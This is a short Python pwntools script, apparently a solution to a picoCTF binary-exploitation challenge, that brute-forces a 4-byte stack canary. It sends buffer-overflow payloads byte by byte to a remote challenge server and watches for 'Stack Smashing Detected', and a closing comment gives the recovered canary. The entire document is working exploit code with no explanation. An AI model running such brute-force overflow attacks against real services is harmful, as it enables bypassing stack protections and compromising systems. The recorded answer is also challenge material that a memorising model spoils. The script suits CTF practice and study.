from pwn import *

canary = b''

while len(canary) < 4:

  for i in range(256):

    buffer_length = 64 + 1 + len(canary)
    payload = b'A' * 64 
    payload += canary
    payload += pack(i, 'all', 'little')

    print(payload)
    print(canary)

    r = remote("saturn.picoctf.net", 57117)

    r.recvuntil(b'> ')
    r.sendline(str(buffer_length))
    r.recvuntil(b'> ')
    r.sendline(payload)
    l = r.recvline()

    print(buffer_length, canary, i)
    print(l)

    if b'Stack Smashing Detected' not in l:
      canary += pack(i, 'all', 'little')

      print(canary)
      
      break

log.info('Found canary: {}'.format(canary))
# Result: 'BiRd'